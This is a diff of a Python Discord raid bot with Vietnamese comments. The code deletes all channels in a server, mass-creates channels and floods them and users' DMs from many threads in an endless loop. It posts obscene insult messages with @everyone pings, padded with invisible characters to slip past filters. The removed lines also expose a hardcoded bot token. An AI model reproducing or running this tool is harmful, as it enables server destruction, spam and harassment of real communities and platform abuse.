@@ -1,21 +1,25 @@
 import discord
-from discord import app_commands
 from discord.ext import commands
+from discord import app_commands
 import asyncio
 import threading
 import random
 import os
 import requests
 import time
+from dotenv import load_dotenv
 from colorama import Fore, Style, init
 
+# Khởi tạo
 init(autoreset=True)
+load_dotenv()
 
 # ==========================================
-# CẤU HÌNH (DÁN TOKEN VÀO ĐÂY)
+# CẤU HÌNH TỪ ENV
 # ==========================================
-TOKEN = 'MTQ1Njg2OTU3Mjk0NTkwMzc3MQ.GFoA1d.SvjYqLXGk8yURqoRGvPC2ORMFOr-63iZDpijMI'
+TOKEN = os.getenv('DISCORD_TOKEN')
 PREFIX = "!"
+HEADERS = {'Authorization': f'Bot {TOKEN}'}
 
 WAR_QUOTES = [
     "# ALO ĐÂU RỒI EM @everyone",
@@ -26,17 +30,15 @@ WAR_QUOTES = [
     "# @everyone @here MÀY CẦM 3 CÁI NGÔN COPY CỦA MÀY GÕ VỚI ANH HẢ BỊ ANH ĐẠP VÔ CÁI HỌNG DÁI MÀY Ở BÊN BỜ ĐƯỜNG A CẦM SÚNG TỈA BÚNG VÔ CÁI LỖ HỌNG THỐI MẸ MÀY NGOÀI LỀ ĐƯỜNG CN ĐĨ MẸ MÀY ÓC CẶC BỊ ANH BEM DỒN 1 GÓC CẠNH CỦA CÁI BƯỚM MẸ MÀY THÂM NHƯ DÁI LỢN SẮP NGHẺO NHÀ TAO MÀ CON ĐĨ NGU ĂN BOÀI SỐNG QUA NGÀY GIÚP TĂNG THÊM TRÌNH ĐỘ ĂN HẠI CỦA MÀY ĐỪNG BỰC BỘI CHỨ CON NÍT CON NOI VỀ HỌC ĐI ĐỪNG ĐÚ ĐỞN ỚT ĐỎ CHỨNG TỎ EM ĐANG CAY ĐỪNG NỐI NHỮNG LỜI EM ĐANG GẶP PHẢI CHỨ KHÔNG CÓ ĂN HỌC RỒI NÊN NỐI CHUYỆN BỊ NGÁO HAY DO MẸ MÀY BẠI LIỆT NÃO NÊN SINH RA THẰNG CON BỊ KHỜ NGU HỌC PHÁT NGÔN NHỮNG CÂU BỊ XÃ HỘI XA LÁNH RUỒNG BỎ TẨY CHAY CON GÁI MẸ MÀY LẾT NGOÀI ĐƯỜNG BÚ PHÂN BÒ ĐỂ TRÁNH ĐÓI QUA NGÀY"
 ]
 
-HEADERS = {'Authorization': f'Bot {TOKEN}'}
-
 def get_pure_msg():
     invis = "".join(random.choices(["\u200b", "\u200c", "\u200d", "\u200e"], k=15))
     return f"{random.choice(WAR_QUOTES)} {invis}"
 
 # ==========================================
-# VJP PRO LOGIC (SỬ DỤNG API TRỰC TIẾP)
+# LOGIC HỦY DIỆT (REQUESTS)
 # ==========================================
 
-def fast_spam_vjp(channel_id):
+def fast_spam(channel_id):
     while True:
         r = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', 
                           headers=HEADERS, json={'content': get_pure_msg()})
@@ -46,27 +48,57 @@ def fast_spam_vjp(channel_id):
         time.sleep(0.1)
 
 def infinite_raid_loop(guild_id):
-    """Vòng lặp Hủy diệt: Xóa -> Tạo -> Spam -> Xóa lại"""
     while True:
-        # 1. Lấy và xóa toàn bộ kênh
+        # Xóa kênh
         r = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=HEADERS)
         if r.status_code == 200:
             for ch in r.json():
                 requests.delete(f"https://discord.com/api/v9/channels/{ch['id']}", headers=HEADERS)
-
-        # 2. Tạo kênh mới và spam
-        for _ in range(50):
-            payload = {'name': 'raid-by-banana', 'type': 0}
-            res = requests.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=HEADERS, json=payload)
+        # Tạo & Spam
+        for _ in range(40):
+            res = requests.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', 
+                                headers=HEADERS, json={'name': 'raid-by-banana', 'type': 0})
             if res.status_code == 201:
                 cid = res.json()['id']
-                # Nã 5 luồng spam vào mỗi kênh
-                for _ in range(5): threading.Thread(target=fast_spam_vjp, args=(cid,), daemon=True).start()
-
-        time.sleep(15) # Đợi 15s rồi lặp lại quy trình xóa-tạo để server nát hoàn toàn
+                for _ in range(3): threading.Thread(target=fast_spam, args=(cid,), daemon=True).start()
+        time.sleep(15)
 
 # ==========================================
-# KHỞI TẠO BOT
+# GIAO DIỆN CMD MENU
+# ==========================================
+def cmd_menu():
+    while not bot.is_ready(): time.sleep(1)
+    while True:
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print(Fore.RED + Style.BRIGHT + rf"""
+    ██████╗  █████╗ ███╗   ██╗ █████╗ ███╗   ██╗ █████╗ 
+    ██╔══██╗██╔══██╗████╗  ██║██╔══██╗████╗  ██║██╔══██╗
+    ██████╔╝███████║██╔██╗ ██║███████║██╔██╗ ██║███████║
+    ====================================================
+    BOT: {bot.user} | ENV: LOADED
+    ====================================================
+    [1] SPAM ALL DMS (NÃ TIN NHẮN RIÊNG)
+    [2] WAR QUA ID KÊNH (NÃ TỪ CMD)
+    [3] XEM NGÔN CHIẾN (CHẠY LOGS)
+    [4] THOÁT
+    ====================================================
+        """)
+        choice = input(Fore.YELLOW + "👉 CHỌN: ")
+        if choice == '1':
+            for channel in bot.private_channels:
+                threading.Thread(target=fast_spam, args=(channel.id,), daemon=True).start()
+        elif choice == '2':
+            cid = input(Fore.CYAN + "🆔 Nhập ID Kênh: ")
+            threading.Thread(target=fast_spam, args=(cid,), daemon=True).start()
+            input("Đang nã... Nhấn Enter để quay lại.")
+        elif choice == '3':
+            while True:
+                print(Fore.WHITE + get_pure_msg())
+                time.sleep(0.1)
+        elif choice == '4': os._exit(0)
+
+# ==========================================
+# BOT DISCORD
 # ==========================================
 class VjpBot(commands.Bot):
     def __init__(self):
@@ -78,20 +110,15 @@ class VjpBot(commands.Bot):
 
 bot = VjpBot()
 
-# --- TỰ ĐỘNG XÓA LỆNH NGƯỜI DÙNG ---
 @bot.event
 async def on_command(ctx):
-    try:
-        await ctx.message.delete() # Xóa tin nhắn lệnh ngay khi gõ
+    try: await ctx.message.delete()
     except: pass
-
-# --- CÁC LỆNH CHIẾN ---
 
 @bot.command()
 async def war(ctx):
-    cid = ctx.channel.id
-    self.war_status[cid] = True
-    while self.war_status.get(cid):
+    bot.war_status[ctx.channel.id] = True
+    while bot.war_status.get(ctx.channel.id):
         await ctx.send(get_pure_msg())
         await asyncio.sleep(0.3)
 
@@ -99,27 +126,13 @@ async def war(ctx):
 async def raid(ctx):
     threading.Thread(target=infinite_raid_loop, args=(ctx.guild.id,), daemon=True).start()
 
-# --- SLASH COMMANDS ---
-
-@bot.tree.command(name="war", description="VJP PRO WAR")
-async def war_slash(interaction: discord.Interaction):
-    await interaction.response.send_message("🔥 WAR ACTIVATED", ephemeral=True)
-    cid = interaction.channel_id
-    bot.war_status[cid] = True
-    while bot.war_active.get(cid):
-        await interaction.channel.send(get_pure_msg())
-        await asyncio.sleep(0.3)
-
-@bot.tree.command(name="raid", description="VJP PRO RAID (INFINITE LOOP)")
+@bot.tree.command(name="raid", description="VJP PRO RAID")
 async def raid_slash(interaction: discord.Interaction):
-    await interaction.response.send_message("☢️ SERVER DESTROYED", ephemeral=True)
+    await interaction.response.send_message("☢️ RAIDING...", ephemeral=True)
     threading.Thread(target=infinite_raid_loop, args=(interaction.guild.id,), daemon=True).start()
 
 @bot.event
 async def on_ready():
-    os.system('cls' if os.name == 'nt' else 'clear')
-    print(f"{Fore.MAGENTA}{Style.BRIGHT}BANANA CAT VJP PRO - LOADED")
-    print(f"Status: Online as {bot.user}")
-    print(f"Commands: {PREFIX}war | {PREFIX}raid")
+    threading.Thread(target=cmd_menu, daemon=True).start()
 
 bot.run(TOKEN)
